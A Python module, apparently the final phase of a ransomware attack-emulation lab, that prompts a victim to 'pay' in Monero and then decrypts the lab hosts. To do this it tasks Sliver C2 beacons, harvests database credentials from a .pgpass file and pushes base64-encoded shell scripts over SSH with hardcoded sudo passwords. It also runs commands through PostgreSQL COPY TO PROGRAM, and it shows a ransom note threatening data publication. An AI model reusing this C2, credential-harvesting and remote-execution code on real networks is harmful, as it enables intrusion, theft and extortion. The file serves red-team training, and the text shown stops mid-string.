"""advanced_restoration.py — Phase 9: Interactive decryption + lab reset.

MITRE ATT&CK:
  T1490 — Inhibit System Recovery (reversed — decrypts in-place-encrypted files so
           the lab environment can be reset for repeat demo runs)
-----------------------------------------------------------------------------
Runs as the final optional step of the advanced chain, after advanced_cleanup_backdoor.
The ransom wallpaper is set by advanced_cleanup_backdoor (T1491.001); this step
resets it after successful decryption.

Phase 1 — Prompt: "Pay the ransom and decrypt files? (Y/N)"

Phase 2a (Y) — Rich progress animation while decryption runs in a background thread.
               On success: reset XFCE wallpaper to default on ubuntu_workstation.
               Completion panel when done.

Phase 2b (N) — Environment stays encrypted + wallpaper stays. Exit cleanly.
"""

import base64
import os
import re
import threading
import time


from chainlog import log
from advanced_initial_access import sliver_exec

from rich.console import Console
from rich.panel import Panel
from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn
from rich.prompt import Confirm
from rich.rule import Rule

_console = Console()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

PGPASS_PATH      = "/home/vinzenz.fedora/.pgpass"
DB_HOST          = "10.30.0.6"
WALLPAPER_REMOTE = "/tmp/ran_wall.jpg"   # set by cleanup_backdoor; reset here after decrypt

# ---------------------------------------------------------------------------
# Helpers — beacon task polling
# ---------------------------------------------------------------------------

def _beacon_task_wait(beacon_id: str, task_id: str, *,
                      max_polls: int = 24, interval: int = 5) -> str | None:
    for _ in range(max_polls):
        time.sleep(interval)
        fetch_out = sliver_exec(beacon_id, f"tasks fetch {task_id}", timeout=30)
        if "✅ Completed" in fetch_out:
            if "[*] Output:" in fetch_out:
                return fetch_out.split("[*] Output:", 1)[1].strip()
            return fetch_out
    return None


def _beacon_exec_wait(beacon_id: str, command: str, *,
                      cmd_timeout: int = 120,
                      max_polls: int = 24, interval: int = 5) -> str | None:
    output = sliver_exec(beacon_id, command, timeout=cmd_timeout)
    m = re.search(r"\[\*\] Tasked beacon \w+ \((.*?)\)", output)
    if not m:
        log(f"[-] No task ID found. Output: {output.strip()}")
        return None
    task_id = m.group(1)
    log(f"[*] Beacon task {task_id} submitted. Polling for completion …")
    return _beacon_task_wait(beacon_id, task_id,
                             max_polls=max_polls, interval=interval)


# ---------------------------------------------------------------------------
# Wallpaper reset — run after successful decryption
# ---------------------------------------------------------------------------

def _reset_wallpaper(vinzenz_beacon: str) -> None:
    """Reset XFCE wallpaper to default on ubuntu_workstation (removes ransom note)."""
    reset_script = (
        "JOHN_UID=$(id -u john.stravidis 2>/dev/null); "
        "SESS_PID=$(pgrep -u john.stravidis -x xfce4-session 2>/dev/null | head -1); "
        "DBUS_ADDR=$(cat /proc/${SESS_PID}/environ 2>/dev/null "
        "| tr '\\0' '\\n' | grep ^DBUS_SESSION_BUS_ADDRESS= | cut -d= -f2-); "
        '[ -z "$DBUS_ADDR" ] && DBUS_ADDR="unix:path=/run/user/${JOHN_UID}/bus"; '
        "echo 'VinzenzAdmin!2026' | sudo -S -u john.stravidis -- "
        'env DISPLAY=:1 DBUS_SESSION_BUS_ADDRESS="$DBUS_ADDR" '
        "xfconf-query -c xfce4-desktop "
        "-p /backdrop/screen0/monitor0/workspace0/last-image "
        "-r 2>/dev/null || true; "
        f"rm -f {WALLPAPER_REMOTE} 2>/dev/null || true; "
        "echo WALLPAPER_RESET"
    )
    b64 = base64.b64encode(reset_script.encode()).decode()
    ssh_cmd = (
        f"execute -o -- sh -c "
        f"'ssh -n -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null john "
        f"\"echo {b64} | base64 -d | sh\" 2>/dev/null || true'"
    )
    out = sliver_exec(vinzenz_beacon, ssh_cmd, timeout=25)
    if out and "WALLPAPER_RESET" in out:
        log("[+] Ransom wallpaper removed — VNC desktop restored to default ✓")
    else:
        log("[-] Wallpaper reset did not confirm (non-fatal)")


# ---------------------------------------------------------------------------
# Network-wide file decryption
# ---------------------------------------------------------------------------

def _discover_db_creds(vinzenz_beacon: str) -> dict | None:
    log(f"[*] Reading DB credentials from {PGPASS_PATH} …")
    result = _beacon_exec_wait(
        vinzenz_beacon,
        f"execute -o -- cat {PGPASS_PATH}",
        max_polls=15, interval=5,
    )
    if result is None:
        log("[-] Task did not complete or returned no output.")
        return None

    for line in result.splitlines():
        line = line.strip()
        if (not line or line.startswith("#") or
            any(kw in line for kw in (
                "Task", "State", "Description", "Created", "Sent",
                "Completed", "Request Size", "Response Size",
                "+-", "| ", "[*]"))):
            continue
        parts = line.split(":", 4)
        if len(parts) == 5:
            host, port, dbname, user, password = parts
            log(f"[+] Found credential: {user}@{host}:{port}/{dbname}")
            return {"host": host, "port": port, "dbname": dbname,
                    "user": user, "password": password}

    log("[-] No usable credential found in .pgpass")
    return None


def _perform_network_restoration(vinzenz_beacon: str, creds: dict) -> bool:
    """Decrypt all .enc files on vinzenz_ws, john_ws, luke_ws, apache and restore DB."""
    privkey_path = "/Attack-chain/exfil_keys/private.pem"
    if os.path.exists(privkey_path):
        with open(privkey_path, "r") as f:
            private_key_pem = f.read().strip()
    else:
        log("[-] Private key not found on kali. Cannot restore.")
        return False

    try:
        restore_script = f"""#!/bin/bash
export HOME="/home/vinzenz.fedora"
export USER="vinzenz.fedora"
cat << 'EOF' > /tmp/privkey.pem
{private_key_pem}
EOF

process_and_restore_local() {{
    local src_dir="$1"
    [ -d "$src_dir" ] || return 0
    echo "VinzenzAdmin!2026" | sudo -S find "$src_dir" -type f -name "*.enc" \\
        ! -path "*/.cache/*" ! -path "*/.ssh/*" 2>/dev/null | while read -r filepath; do
        local orig="${{filepath%.enc}}"
        echo "VinzenzAdmin!2026" | sudo -S openssl cms -decrypt -binary \\
            -in "$filepath" -out "$orig" -inkey /tmp/privkey.pem 2>/dev/null \\
            && echo "VinzenzAdmin!2026" | sudo -S rm "$filepath"
    done
}}

echo "[*] Restoring vinzenz_ws ..."
for udir in /home/* /root; do [ -d "$udir" ] && process_and_restore_local "$udir"; done
for d in /etc/ssh /run/secrets /var/lib/mysql /var/lib/postgresql /var/lib/redis \\
         /var/spool/mail /var/mail; do
    [ -d "$d" ] && process_and_restore_local "$d"
done

build_remote_restore_script() {{
    cat << 'REOF'
#!/bin/bash
cat << 'EOF2' > /tmp/privkey.pem
{private_key_pem}
EOF2
process_and_restore() {{
    local src_dir="$1"; [ -d "$src_dir" ] || return 0
    echo "VinzenzAdmin!2026" | sudo -S find "$src_dir" -type f -name "*.enc" \\
        ! -path "*/.cache/*" ! -path "*/.ssh/*" 2>/dev/null | while read -r filepath; do
        local orig="${{filepath%.enc}}"
        echo "VinzenzAdmin!2026" | sudo -S openssl cms -decrypt -binary \\
            -in "$filepath" -out "$orig" -inkey /tmp/privkey.pem 2>/dev/null \\
            && echo "VinzenzAdmin!2026" | sudo -S rm "$filepath"
    done
}}
for udir in /home/* /root; do [ -d "$udir" ] && process_and_restore "$udir"; done
for d in /etc/ssh /var/www/html /run/secrets /var/lib/mysql /var/lib/postgresql \\
         /var/lib/redis /var/spool/mail /var/mail; do
    [ -d "$d" ] && process_and_restore "$d"
done
rm -f /tmp/privkey.pem
REOF
}}

build_remote_restore_script > /tmp/restorer.sh
B64=$(base64 -w0 /tmp/restorer.sh)
for host in john luke apache; do
    echo "[*] Restoring $host ..."
    ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null "$host" \\
        "echo \\"$B64\\" | base64 -d > /tmp/restorer.sh \\
         && echo 'VinzenzAdmin!2026' | sudo -S bash /tmp/restorer.sh \\
         && rm -f /tmp/restorer.sh" || echo "[-] $host restore failed"
done
rm -f /tmp/restorer.sh /tmp/privkey.pem
echo "[+] Network file restoration completed"
"""
        b64_script = base64.b64encode(restore_script.encode()).decode()
        log("[*] Tasking beacon with network-wide restoration script …")
        out = _beacon_exec_wait(
            vinzenz_beacon,
            f"execute -o -- sh -c 'echo {b64_script} | base64 -d | bash'",
            cmd_timeout=180, max_polls=36, interval=5,
        )
        if out:
            log(f"[+] Restoration output:\n{out}")
        else:
            log("[-] Restoration beacon task timed out or returned no output.")

        _db_restoration(vinzenz_beacon, creds, private_key_pem)

    except Exception as exc:
        log(f"[-] Exception during restoration: {exc}")
        return False

    return True


def _db_restoration(vinzenz_beacon: str, creds: dict, private_key_pem: str) -> bool:
    log("[*] Restoring PostgreSQL database from encrypted archive …")
    try:
        privkey_b64 = base64.b64encode(private_key_pem.encode()).decode().strip()
        sql_create = "CREATE DATABASE waystar;"
        sql_import = (
            f"COPY (SELECT 1) TO PROGRAM $$"
            f"echo '{privkey_b64}' | base64 -d > /tmp/privkey.pem && "
            f"openssl cms -decrypt -binary -in /var/lib/postgresql/TEST.sql.enc "
            f"-inkey /tmp/privkey.pem -out /tmp/restore.sql && "
            f"PGPASSWORD='{creds['password']}' psql -h 127.0.0.1 -U {creds['user']} -d waystar -f /tmp/restore.sql && "
            f"rm -f /tmp/privkey.pem /tmp/restore.sql /var/lib/postgresql/TEST.sql.enc$$;"
        )
        db_code = (
            f"import subprocess, sys\n"
            f"try:\n"
            f"    env = {{\"PGPASSWORD\": \"{creds['password']}\","
            f" \"PATH\": \"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"}}\n"
            f"    r = subprocess.run([\"psql\",\"-h\",\"{creds['host']}\","
            f"\"-p\",\"{creds['port']}\",\"-U\",\"{creds['user']}\","
            f"\"-d\",\"postgres\",\"-c\",\"\"\"{sql_create}\"\"\"],"
            f"env=env,capture_output=True,text=True)\n"
            f"    if r.returncode != 0: print(f\"[*] DB create note: {{r.stderr.strip()}}\")\n"
            f"    r2 = subprocess.run([\"psql\",\"-h\",\"{creds['host']}\","
            f"\"-p\",\"{creds['port']}\",\"-U\",\"{creds['user']}\","
            f"\"-d\",\"postgres\",\"-c\",\"\"\"{sql_import}\"\"\"],"
            f"env=env,capture_output=True,text=True)\n"
            f"    if r2.returncode == 0: print(\"[+] DB restoration successful\"); sys.exit(0)\n"
            f"    else: print(f\"[-] DB restoration failed: {{r2.stderr.strip()}}\"); sys.exit(1)\n"
            f"except Exception as e: print(f\"[-] DB error: {{e}}\"); sys.exit(1)\n"
        )
        b64_db = base64.b64encode(db_code.encode()).decode()
        out = _beacon_exec_wait(
            vinzenz_beacon,
            f"execute -o -- python3 -c \"import base64; exec(base64.b64decode('{b64_db}').decode())\"",
            cmd_timeout=30, max_polls=6, interval=5,
        )
        if out:
            log(f"[+] DB output: {out.strip()}")
            return "[+] DB restoration successful" in out
        log("[-] DB restoration: no output returned.")
        return False
    except Exception as exc:
        log(f"[-] DB restoration exception: {exc}")
        return False


# ---------------------------------------------------------------------------
# Animation wrapper — runs restoration in background, shows rich progress
# ---------------------------------------------------------------------------

_RANSOM_PAID_BANNER = """\
[bold red]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡼⠛⠸⢻⣯⣿⣽⢷⣻⣟⡾⣷⣻⣤⣤⣿⣾⠛⠀⠀⠛⣤⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡼⠻⠏⠀⠀⠀⠀⠀⠘⠟⠻⠛⠟⠻⠛⠟⠻⠻⠀⠀⠀⠀⠀⠀⠀⠛⠟⢦⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠾⠿⠿⠿⠿⠿⢆⡀⠀⠀⠀⠀⠀⠀⢠⣠⡼⠿⠏⠁⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁
⠀⠀⠀⠀⠀⠀⠀⠀⣠⠾⠉⠉⠀⠀⠀⠀⠀⠀⠸⢇⡀⠀⠀⠀⢀⡴⠏⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⠾⠉⠀⠀⠀⠀⠀⣀⡀⠲⢆⡀⣽⡇⠀⠀⢀⡸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠿⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠿⠿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⠿⠀⠀⠀⠀⠶⣀⠀⠉⢷⡄⢻⣇⡹⠇⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⢰⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⢿⣿⠿⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡆
⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣿⠀⠀⣿⡷⠏⠉⠁⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢰⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠶⠾⠉⠶⠶⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢵
⠀⠀⠀⠀⣀⠿⠀⠀⠀⠀⠶⣀⣿⡷⠶⠋⠀⠀⠀⠀⠀⠀⠀⠈⠱⢆⣀⣀⣀⣀⣰⠞⢱⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡏
⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⣶⠋⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠋⠙⠉⠋⠁⠀⠈⢳⣆⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡴⠏⢳
⠀⠀⠀⣶⠛⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⢀⡀⡀⢀⡀⢀⠘⠛⢳⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣴⣶⣶⣴⣦⠛⠛⠀⠀⠀
⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣤⡜⠛⠛⠛⠛⠛⢳⡜⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⠀⠀⣤⠀⣤⣤⣤⠀⠀⠀⠀⠀⠀
⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠛⣤⠀⠀⠀⢤⣤⣤⣤⣤⡄⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡤⠀⠀⢠⣤⣼⠛⠛⠛⠛⠀⠀⠀⠀⠀⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣦⠛⠛⠃⠀⠀⠀⠀⠘⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⠀⠀⣤⠛⠀⠀⠀⠀⠀⠀
⠈⠻⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠛⠛⠃⠀⠀⠀⠘⠃⢠⣤⣤⣤⣤⣤⡼⠛⢫⣤⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠛⠛⠛⠛⠛⠛⣤⠟⠂⠀⠀
⠀⠀⣿⠻⣤⣤⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡜⠃⠀⠀⠀⠀⠘⠛⢫⣄⠘⠛⠛⠛⠛⠛⠛⠛⠛⠻⣤⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠻⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡼⢣⡄⠀⠀⠀⠀⠀⠀⠀⢸⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⡄⠀⠀
⠀⠀⠀⠀⠉⠿⠿⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⡼⠿⠿⠏⠀⠈⠸⢧⡄⠀⠀⠀⠀⠀⢸⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣤⣤⠀⠀⠀⠀⠀⠀⠀⠀⣾⠁⠹⠟⠿
⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⠹⢧⣀⡄⠀⠀⠈⢹⡷⠀⠀⠀⠀⠀⠀⠀⠀⣿⠉⠉⠿⠿⠿⠀⠀⠀⠾⠉⠀⠀⠀⠀⠀
[/bold red]
[dim]P A Y M E N T   R E C E I V E D   ·   D E C R Y P T I O N   I N I T I A T I N G[/dim]"""

_SKULL_ART = """\
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⡟⠀⣴⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠏⢰⣡⢞⡽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⢁⣠⣟⡵⠛⠀⠀⠀⣀⡠⠤⢀⣀⣀⣒⣒⣢⣤⣤⣤⣀⣀⠠⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣛⣀⣴⠟⢋⡿⠁⣀⠴⠚⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠈⠉⠙⠓⠿⢶⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⢿⣋⡽⠋⢀⣾⡷⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢶⢤⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠉⠀⣰⠋⠀⣠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡶⠋⠁⢀⣠⣾⢷⣶⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⢿⣫⠔⠒⣾⣯⡥⣴⣿⡛⠀⠀⠀⠀⠀⣠⠄⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠟⢋⣀⠤⠚⣉⣷⡾⠟⠝⣱⠂⢠⣤⠐⢀⡻⠀⠀⢸⣿⣷⣶⣤⣤⣤⣤⣤⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⢯⣁⡤⠒⠋⢁⣠⠞⣻⠋⢠⠞⢸⠁⣠⣿⣮⣧⢴⠳⠄⢀⡼⣿⣿⣿⣿⣿⣿⠟⠛⣻⣟⣀⡀⠀⠀⢠⣴⡶⠒⠲⣤⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⣺⠇⢷⢀⡴⠛⢁⣴⡇⣠⠋⢠⣿⣴⣿⣿⣿⡏⠀⠀⠀⠘⣟⣛⣻⣿⣿⣿⣿⡦⠖⠛⠚⠚⠿⢿⣲⠦⣽⣦⡄⠀⠸⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⠀⣀⡞⠁⠀⣸⡟⢀⣴⠟⠀⢙⠇⠀⣾⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⢹⣿⠛⠁⠉⠁⠀⠀⠀⠀⠀⠀⠀⠈⣧⡆⢹⣧⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠎⠀⢀⣴⣏⣠⣴⠿⠋⠛⠛⢁⡠⠞⠋⠀⢠⣿⡏⢘⣿⣷⣦⡀⠀⠀⠀⣤⣤⣂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⣸⡿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣴⡟⠀⣠⡿⠀⢈⣽⠁⠀⣀⡴⠒⠉⠀⠀⠀⢀⡞⠉⣟⠛⣄⣿⣿⣿⣦⡄⠸⣿⡿⠉⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⣶⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣄⡀⣤⠞⠹⣦⣾⣯⣤⣠⠟⠁⠸⡏⠁⠀⠀⠀⠀⠀⢠⣿⠇⠀⠈⢹⣿⣿⣿⠛⠿⣿⣏⠁⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⠇⢸⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀
⠀⢀⣼⠋⠀⠳⢧⣄⢀⣿⣞⠑⣮⣁⠤⠴⠞⠁⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠘⠀⡿⡏⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⡿⠀⢸⡿⢟⣹⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀
⢀⣼⣧⠀⠀⠀⢀⣼⡟⠳⠙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⣀⣠⣤⠀⠀⠀⠀⠀⠀⢀⠀⢀⠀⡀⠀⠀⢸⢿⣿⣿⣿⠟⠃⠀⠀⠀⣼⣿⣿⣽⣿⠋⣿⠃⠀⠀⠀⠀
⡾⣱⠏⠀⠀⣠⠾⣋⡇⢀⠜⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣽⣿⡄⠀⢠⠀⢠⡆⢸⡀⢸⠀⡇⡇⠀⣸⣿⣿⣿⠏⠀⠀⠀⠀⣤⣿⣿⣿⠟⠁⠀⠋⠀⠀⠀⠀⢠
⣴⠋⠀⣠⡞⠁⣰⠋⣱⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⠀⣄⣼⡦⡾⡷⢻⠏⠻⣿⠻⣿⣾⣿⣿⣿⡇⠀⠀⠀⢀⣤⣾⣿⣿⣿⡇⠀⠀⠀⢀⣀⣠⣤⡾
⠁⣠⡾⠋⠀⡴⢁⣴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣻⡞⢏⠉⡇⡇⡆⢸⡆⠰⠃⠀⢸⠹⣿⠟⠉⠀⠀⢀⡴⠋⠀⣿⣿⣿⠟⠿⣶⣾⣿⠿⠷⠚⠉⠀"""

_DECRYPT_PHASES = [
    "Verifying XMR transaction ...",
    "Contacting decryption server ...",
    "Uploading private key ...",
    "Decrypting vinzenz_ws ...",
    "Decrypting john_ws ...",
    "Decrypting luke_ws ...",
    "Decrypting apache ...",
    "Restoring database ...",
    "Cleaning up temporary keys ...",
]


def _animate_and_restore(vinzenz_beacon: str, creds: dict) -> bool:
    """Run decryption in a background thread; display rich progress animation."""
    result_box: dict = {}
    exc_box:    list  = [None]

    def _worker():
        try:
            result_box["ok"] = _perform_network_restoration(vinzenz_beacon, creds)
        except Exception as exc:
            exc_box[0] = exc
            result_box["ok"] = False

    _console.print(Panel(_RANSOM_PAID_BANNER, border_style="red", padding=(0, 2)))
    _console.print()

    thread = threading.Thread(target=_worker, daemon=True)
    thread.start()

    phase_duration   = 20          # seconds to show each phase label
    estimated_total  = len(_DECRYPT_PHASES) * phase_duration

    with Progress(
        SpinnerColumn("dots2", style="bold red"),
        TextColumn("[bold white]{task.description:<45}"),
        BarColumn(bar_width=38, style="dark_red", complete_style="green"),
        TextColumn("[green]{task.percentage:>3.0f}%"),
        TimeElapsedColumn(),
        console=_console,
        transient=False,
    ) as progress:
        task = progress.add_task(_DECRYPT_PHASES[0], total=100)
        elapsed = 0

        while thread.is_alive():
            time.sleep(1)
            elapsed += 1
            pct       = min(95, int(elapsed / estimated_total * 100))
            phase_idx = min(len(_DECRYPT_PHASES) - 1, elapsed // phase_duration)
            progress.update(task, completed=pct,
                            description=_DECRYPT_PHASES[phase_idx])

        progress.update(task, completed=100,
                        description="[bold green]Decryption complete!            ")

    thread.join()
    if exc_box[0]:
        raise exc_box[0]

    _console.print()
    _console.print(Panel(
        "[bold green]✓  All files have been restored.[/bold green]\n\n"
        "[dim]Your data has been recovered.\n"
        "We trust you have learned a valuable lesson about endpoint protection.[/dim]",
        border_style="green",
        padding=(1, 4),
    ))
    _console.print()

    return result_box.get("ok", False)


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

def run(root_sliver_session: str, vinzenz_beacon: str, results_dir: str) -> dict:
    """Phase 9 — interactive decryption prompt + animation + wallpaper reset."""
    log("\n[*] Starting Phase 9: Ransomware Recovery …")

    if not vinzenz_beacon:
        log("[-] No active vinzenz beacon — cannot proceed.")
        return {"restore_success": False}

    # Phase 1: show impact context + prompt
    _console.print()
    _console.print(Panel(
        "[bold red]:)[/bold red]  [bold]Your files are encrypted. Now you know how it feels.[/bold]\n\n"
        "The ransom wallpaper is now visible on the victim desktop "
        "[bold](VNC → localhost:5901)[/bold].\n\n"
        "To recover your files, send [bold cyan]690 Monero XMR[/bold cyan] "
        "to [bold cyan]mi-m0n3ro-address[/bold cyan]\n"
        "[dim]  … or proceed with the lab restoration below.[/dim]",
        title="[bold red]  RANSOMWARE IMPACT  [/bold red]",
        border_style="red",
        padding=(1, 4),
    ))
    _console.print()

    _console.print()
    _console.print(Rule(
        "[bold yellow]  Pay the ransom and decrypt files?  [/bold yellow]",
        style="yellow",
    ))
    _console.print()
    do_restore = Confirm.ask("[bold yellow]Decrypt now[/bold yellow]")

    if not do_restore:
        log("[*] User declined restoration. Environment remains encrypted.")
        _console.print()
        _console.print(Panel(
            _SKULL_ART + "\n\n"
            "[bold red]You chose not to pay.[/bold red]\n\n"
            "[bold]Your data will be published and sold within 72 hours.[/bold]\n"
